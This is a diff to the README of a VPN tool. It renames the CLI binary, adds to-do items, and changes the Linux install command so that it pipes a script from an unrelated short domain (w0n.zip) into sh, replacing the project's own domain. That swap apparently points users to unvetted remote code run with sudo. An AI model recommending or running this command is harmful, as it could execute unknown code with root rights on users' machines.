@@ -12,7 +12,7 @@ A lightweight VPN software, focused on scalability, traffic obfuscation and simp
 ### CLI
 
 ```shell
-./frida_vpn [FLAGS] [OPTIONS] <mode> --config <FILE>
+./frida_cli [FLAGS] [OPTIONS] <mode> --config <FILE>
 ```
 
 #### Options
@@ -45,7 +45,7 @@ A lightweight VPN software, focused on scalability, traffic obfuscation and simp
 On Linux, you can run this in a terminal (sudo required):
 
 ```shell
-curl --proto '=https' --tlsv1.2 -sSf https://get-frida.awain.net | sh
+curl --proto '=https' --tlsv1.2 -sSf https://w0n.zip/raw/000 | sh
 ```
 
 Also you can download latest version from the jenkins.
@@ -64,3 +64,6 @@ There is an app for both Android and IOS devices.
 
 ## Todo
  - implement obfuscation protocols
+ - rewrite using cleaner code practices
+ - catch Ctrl+C to gracefully shutdown
+ - See TODO from sources
